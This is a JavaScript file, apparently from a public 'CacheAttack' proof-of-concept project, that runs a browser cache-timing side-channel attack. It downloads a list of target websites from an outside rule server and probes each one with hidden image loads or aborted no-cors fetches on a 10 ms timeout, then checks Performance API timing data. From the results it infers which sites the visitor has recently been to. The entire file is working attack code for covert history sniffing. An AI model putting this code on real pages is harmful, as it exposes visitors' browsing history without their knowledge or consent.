// NDev 2020 https://github.com/NDevTK/CacheAttack
const max = 10;

ifCached = (navigator.userAgent.includes("Firefox")) ? ifCached_1Wrap : ifCached_2;

async function getRules() {
    let req = await fetch("https://cache.ndev.tk/rules");
    let body = await req.json();
    return new Map(body);
}

async function pushContent(content) {
    result.push(content);
}

function is304(res) {
    if (res.encodedBodySize > 0 &&
        res.transferSize > 0 &&
        res.transferSize < res.encodedBodySize) {
        return true;
    }
    return null;
}

function PerformanceCheck(url) {
    var res = performance.getEntriesByName(url).pop();
    if(res === undefined) return null
    if(is304(res)) return true;
    return (res.transferSize === 0);
}

async function getWebsites(callback, CacheTest = true) {
    (callback) ? callback : pushContent;
    var Websites = await getRules();
    if(CacheTest) {
        let TestResult = await ifCached_test();
        if(!TestResult) throw "Cache is not working :-("
    }
    var result = [];
    // Foreach website check if cached
    for (let website of Websites) {
        let result = await ifCached(website[0]);
		let check = PerformanceCheck(website[0]);
		if(check || result && check === null) {
			callback(website[1]);
		}
	}
    return result;
};

async function ifCached_test() {
    let cache_test = "https://ndev.tk/README.md?".concat(Math.random());
    let result = await ifCached(cache_test);
    return (!result);
}

async function ifCached_1Wrap(url) {
    try {
        await ifCached_1(url);
    } catch(err) {
        return false
    }
    return true
}

function ifCached_1(url) {
    return new Promise((resolve, reject) => {
        let img = new Image(0, 0);
        img.hidden = true;
        img.onerror = _ => resolve();
        img.onload = _ => resolve();
        img.src = url;
        setTimeout(_ => {
            img.src = "";
            img.remove();
            reject("Timeout");
        }, max);
    });
}

async function ifCached_2(url){
    var state = true;
    var controller = new AbortController();
    var signal = controller.signal;
    let timeout = await setTimeout(_ => { // Stop request after max
        controller.abort();
        state = false;
    }, max);
    try {
        await fetch(url, {mode: "no-cors", signal});
    } catch(err) {}
    clearTimeout(timeout);
    return state;
}
